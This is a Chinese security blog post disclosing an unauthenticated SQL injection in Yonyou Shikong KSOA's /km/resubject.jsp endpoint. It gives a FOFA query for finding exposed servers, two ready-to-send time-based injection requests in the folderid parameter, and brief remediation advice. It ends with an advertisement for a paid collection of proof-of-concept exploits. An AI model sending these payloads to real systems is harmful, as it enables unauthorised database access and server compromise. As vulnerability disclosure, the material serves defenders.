#  用友时空KSOA resubject 存在sql注入漏洞  
原创 北雪网络安全
                    北雪网络安全  北雪网络安全   2026-09-12 01:29  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa:app="  
用友  
-  
时空  
KSOA"  
  
  
  
03  
  
漏洞复现  
  
用友时空  
KSOA  
是建立在  
SOA  
理念指导下研发的新一代产品，是根据流通企业最前沿的  
I  
需求推出的统一的  
IT  
基础架构，它可以让流通企业各个时期建立的  
IT  
系统之间彼此轻松对话，帮助流通企业保护原有的  
IT  
投资，简化  
IT  
管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。未经身份验证的远程攻击者除了可以利用  
SQL  
注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjTp36G7BLhYySKKb6sNYqGv6HZiaZ2q6XxuNnIa5vLTentnMYQZxEibL7qUPUscul9tWvZlbqK1ptYQK9oStHtkLSIG1nxloibZ4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziauQqd5cWQC9sSh7ydrNCYKaTt2vBEHC1CuVRn4tk4icB6CCDBvmd8bJYfPdw6nEVianqtWOzNw4B2cylsd2fGDHjoJ9UlZfXmv4/640?wx_fmt=png&from=appmsg "")  
  
```
GET /km/resubject.jsp?folderid=';WAITFOR+DELAY+'0:0:2'-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjx63BA6DaAce75YveNdQsfZCmVYISxd4aXFDVOf7BIV9tlpQTu5l6Ym5V3RQNCL0tM1vT7AxB9VtTIdzYhRzdmxp1Xdiaq0Vao/640?wx_fmt=png&from=appmsg "")  
```
GET /km/resubject.jsp?folderid=';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzj9Of8euXhR4ybYS9rSIqRG4ia0RyibCemoTphcZ6mY7IpKMMSIamdAuEmmvFj8SrfelyMw4nyLoAicehtiaGbuudq2KTcL6XicYdLk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjCTgr9e3FyzyQfGmxj39TLXaC09fDqUuCzicM9jkeKfYfCaicSrXD1lRXsr3FmsRI5r883Ddwjdw2MiaCicMEZibCH9pPOV4icmFWbs/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgHsHPEyVibA3piakyIkvWGPprUicnYDDyicpElYzSAztwXjzbxzfovfq2DLTsZlIXTX55kEoUwb8hp1vXNC69enBMfpKrVlUveOYk/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
  
